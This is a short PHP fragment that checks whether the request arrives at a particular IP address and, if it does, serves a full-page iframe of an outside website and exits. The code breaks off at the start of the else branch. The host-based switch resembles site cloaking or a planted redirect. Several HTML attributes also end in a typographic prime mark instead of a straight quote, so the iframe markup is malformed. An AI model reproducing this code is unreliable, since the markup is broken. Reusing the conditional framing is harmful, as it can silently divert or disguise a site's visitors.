<?php
if($_SERVER['HTTP_HOST'] == '39.101.149.218'){
    echo '<body style="margin:0px"><iframe src="https://meiyouzijie.com/" width="100%″ frameborder="0" border="0″ marginwidth="0″ marginheight="0″ scrolling="no" allowtransparency="yes" style="height: 100%;border:0px;"></iframe></body>';
    exit();
}else{
